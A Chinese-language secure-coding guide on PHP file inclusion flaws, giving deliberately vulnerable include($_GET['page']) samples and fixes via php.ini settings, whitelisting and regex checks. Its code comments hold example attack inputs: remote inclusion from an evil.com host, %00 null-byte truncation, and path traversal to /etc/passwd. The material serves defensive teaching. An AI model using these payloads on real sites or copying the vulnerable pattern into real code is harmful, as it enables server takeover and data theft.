## 文件包含【高危】

### 原理概述：
业务系统由于功能实现需要、或者PHP框架本身特性，通常都会通过PHP典型方法包含一些代码文件，如果研发同学编码时，对包含的文件名或文件名部分值没有做好严格校验或过滤，就可能给黑客可趁之机，进而包含黑客想要执行的恶意代码。通常文件包含漏洞分为本地文件包含和远程文件包含。两者区别在于php.ini中allow_url_fopen和allow_url_include选项是否开启。
### 危害
1.直接执行恶意代码，可能导致黑客获取网站控制权甚至是服务器控制权
2.造成敏感信息泄露，如：程序源代码，服务器上的敏感文件如/etc/passwd等
...
### BadCase样例
主要涉及到的函数有：``include()`` ``require()`` ``include_once()`` ``require_once()``
BadCase样例1:
```php
/*
$file通过GET方式获取，未经检查就直接包含，如果php.ini中allow_url_fopen
或者allow_url_include为on，攻击者就能让程序包含一个远程恶意文件
如：page=http://www.evil.com/trojan.txt，其中trojan.txt中有黑客写的恶意代码
如果不开启上述两个选项，也能造成本地包含，攻击者完全可以上传一个带有恶意代码的文件
然后再去包含这个文件
*/

$file=$_GET['page'];
if($file)
{
  include($file);
}
```

BadCase样例2:
```php
/*
看似include中限制了文件名，但实际上黑客可以通过提交%00（即0x00）来对文件名进行截断
如:page=hack.php%00
又因为PHP会对不能执行的文件内容原样输出，所以攻击者也能通过这个特性读取服务器上的敏感文件
如：page=../../../../../etc/passwd%00
*/

$file=$_GET['page'];
if($file)
{
  include($file.".controller.php");
}
```

### 修复建议
1.如无必要，php.ini中设置``allow_url_fopen``与``allow_url_include``均为Off，用以防止远程文件包含（防御本地文件包含见第2-5条建议）；
样例如下：

```
; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-fopen
allow_url_fopen = Off

; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = Off
```

2.在php.ini中设置include_path以及openbase_dir的值为可信赖的路径，只允许包含特定路径下的文件，注意open_basedir的配置，windows下多路径使用分号隔开，Linux下多路径使用冒号隔开
样例如下：
```
; UNIX: "/path1:/path2"
include_path = "/var/www/"
;
; Windows: "\path1;\path2"
include_path = "d:/php/include/"

; open_basedir, if set, limits all file operations to the defined directory
; and below.  This directive makes most sense if used in a per-directory
; or per-virtualhost web server configuration file.
; http://php.net/open-basedir
open_basedir ="/var/allowPath1/:/var/allowPath2/"
```
3.如果需要动态包含文件，则要对传入的参数值做检查，严格禁止文件名中出现如``../``以及``%00``这样的字符，同时要对最终包含的文件名做白名单限制；

参考样例1(<B>首选方案：白名单控制</B>，通常用于在MVC框架中初始化控制器等功能模块，因为通常情况下controller/model/view类总是事先定义好的)：
```php
$file=$_GET['page'];
$allowFileWhiteList=array(file1,file2,file3);  //白名单控制允许包含的文件名
if(!in_array($file,$allowFileWhiteList))
{
  die("Error!");
}
else
{
  include($file.".class.controller.php");
}
```
参考样例2(对文件名做正则校验，适用于无法用白名单的情况)
```php
$file=$_GET['page'];
/*
对文件名做正则检查，通常每个产品线都会有自己的命名规范，且文件名长度也都不会太长
本例中取文件名长度不能超过20个字符，各产品线可根据自己的情况进行调整表达式及文件名长度
*/
$pattern='/^[a-zA-Z]{1,20}$/';
if(!preg_match($pattern,$file))
{
  die("Error!");
}
else
{
  include($file.".controller.php")
}
```
4.如果应用中需要包含的文件名是可预知的，建议直接在代码里面做硬编码，彻底取消由外部传入参数这条途径
